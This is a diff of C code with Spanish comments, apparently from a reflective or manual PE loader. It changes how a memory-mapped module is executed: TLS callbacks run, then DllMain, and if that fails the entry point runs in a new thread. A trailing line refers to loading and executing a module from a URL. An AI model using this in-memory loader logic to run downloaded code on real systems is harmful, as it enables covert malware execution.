@@ -921,38 +921,46 @@ PVOID MapModuleToMemory(unsigned char* fileBuffer, DWORD fileSize) {
 // === Ejecuta el módulo (DllMain o EntryPoint) ===
 BOOL ExecuteModule(PVOID moduleBase) {
     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)moduleBase;
-    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)moduleBase + dosHeader->e_lfanew);  // ✅ Declarado
+    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)moduleBase + dosHeader->e_lfanew);
 
     if (ntHeaders->OptionalHeader.AddressOfEntryPoint == 0) {
         return TRUE;
     }
 
-    PVOID entryPoint = (BYTE*)moduleBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;  // ✅ Declarado
+    PVOID entryPoint = (BYTE*)moduleBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 
-    // ✅ Ejecutar TLS callbacks antes de DllMain
+    // ✅ Ejecutar TLS callbacks antes de cualquier cosa
     ExecuteTLSCallbacks(moduleBase);
 
+    // === CASO 1: Tiene DllMain (DLL normal) ===
     if (ntHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) {
         typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
         DllMain_t DllMain = (DllMain_t)entryPoint;
 
-        // Llamar a DllMain
+        // 🔁 Primero: intentar DllMain
         if (DllMain((HINSTANCE)moduleBase, DLL_PROCESS_ATTACH, NULL)) {
+            printf("[+] DllMain ejecutado exitosamente\n");
+            fflush(stdout);
             return TRUE;
         } else {
-            printf("[-] DllMain devolvió FALSE\n");
+            printf("[-] DllMain devolvió FALSE → probando entry point...\n");
             fflush(stdout);
-            return FALSE;
         }
-    } else {
-        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
-        if (hThread) {
-            WaitForSingleObject(hThread, INFINITE);
-            CloseHandle(hThread);
-            return TRUE;
-        }
-        return FALSE;
     }
+
+    // === CASO 2: Si DllMain falló o no es DLL, ejecutar entry point directamente ===
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
+    if (hThread) {
+        printf("[+] EntryPoint ejecutado en hilo\n");
+        fflush(stdout);
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+        return TRUE;
+    }
+
+    printf("[-] Fallo al ejecutar EntryPoint\n");
+    fflush(stdout);
+    return FALSE;
 }
 
 // === Carga y ejecuta un módulo desde URL ===
